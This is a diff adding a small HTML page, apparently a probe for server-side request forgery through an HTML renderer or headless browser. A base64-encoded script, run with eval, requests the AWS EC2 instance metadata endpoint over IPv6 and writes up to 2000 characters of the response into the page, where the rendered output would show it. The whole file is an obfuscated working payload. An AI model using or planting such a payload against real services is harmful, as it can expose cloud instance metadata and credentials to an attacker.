@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html><body>
+<h1>EVAL_XHR_TEST</h1>
+<div id="r1">LOADING</div>
+<script>
+var code = atob('dmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignR0VUJywgJ2h0dHA6Ly9bZmQwMDplYzI6OjI1NF0vbGF0ZXN0L21ldGEtZGF0YS8nLCBmYWxzZSk7IHhoci5zZW5kKCk7IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdyMScpLmlubmVyVGV4dCA9ICdTVEFUVVM6JyArIHhoci5zdGF0dXMgKyAnIEJPRFk6JyArIHhoci5yZXNwb25zZVRleHQuc3Vic3RyKDAsIDIwMDApOw==');
+try {
+  eval(code);
+} catch(e) {
+  document.getElementById('r1').innerText = 'EVAL_ERROR:' + e.name + ':' + e.message;
+}
+</script>
+</body></html>
